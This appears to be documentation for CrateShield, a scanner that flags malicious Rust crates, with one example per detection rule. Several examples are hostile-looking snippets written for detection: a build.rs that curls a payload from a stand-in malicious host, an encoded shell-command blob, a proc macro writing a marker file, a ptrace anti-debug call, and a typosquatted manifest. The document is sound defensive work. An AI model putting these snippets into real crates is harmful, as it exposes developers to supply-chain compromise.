# CrateShield Signals

CrateShield extracts several families of static signals to detect potentially malicious behavior in Rust crates. Each signal family outputs structured evidence (file, line range, and snippet) to aid human review.

## 1. Build Scripts (`build_rs.py`)
Analyzes `build.rs` files for suspicious activity during crate compilation.
**Triggers**: Network connections (`TcpStream::connect`), process spawning (`Command::new`), arbitrary file writes, and sensitive environment variable reads (e.g., `CARGO_REGISTRY_TOKEN`).
**Example**:
```rust
fn main() {
    std::process::Command::new("curl").arg("http://malicious.com/payload.sh").status().unwrap();
}
```

## 2. Unsafe Code and FFI (`unsafe_ffi.py`)
Monitors the usage of `unsafe` blocks and foreign function interfaces (FFI).
**Triggers**: High ratio of `unsafe` blocks per KLOC, direct `libc::syscall` invocations, or suspicious `extern` blocks.
**Example**:
```rust
unsafe {
    libc::syscall(libc::SYS_ptrace, libc::PTRACE_TRACEME, 0, 0, 0);
}
```

## 3. Procedural Macros (`proc_macro.py`)
Flags procedural macros that perform I/O operations, as macros run at compile-time on the developer's machine.
**Triggers**: Imports or usage of `std::fs`, `std::net`, `std::process`, or network crates like `reqwest` within a crate marked `proc-macro = true`.
**Example**:
```rust
use std::fs::File;
use proc_macro::TokenStream;

#[proc_macro]
pub fn do_nothing(_item: TokenStream) -> TokenStream {
    let _ = File::create("/tmp/pwned");
    "fn dummy() {}".parse().unwrap()
}
```

## 4. Obfuscation and Hardcoded Network Indicators (`obfuscation.py` & `network.py`)
Detects attempts to hide payloads or exfiltrate data to known bad domains.
**Triggers**: High-entropy strings, Base64/Hex blobs, string concatenation hiding URLs, and hardcoded IPs or pastebin domains (e.g., `pastebin.com`, `discord.com/api/webhooks`).
**Example**:
```rust
let blob = "ZXhlYyBzaCAvaHR0cDovL21hbGljaW91cy5jb20vYmFzaA==";
```

## 5. Metadata, Dependencies, and Typosquatting (`metadata.py`, `dependencies.py`, `typosquat.py`)
Analyzes package metadata for supply-chain attacks.
**Triggers**: Names suspiciously similar to popular crates (e.g., `reqwests` instead of `reqwest`), lack of a repository link, sudden major version bumps, or dependencies on known pastebin/tunneling services.
**Example**:
```toml
[package]
name = "serde_json_api" # Typosquatting 'serde_json'
version = "99.0.0"      # Version bump
# Missing repository field
```
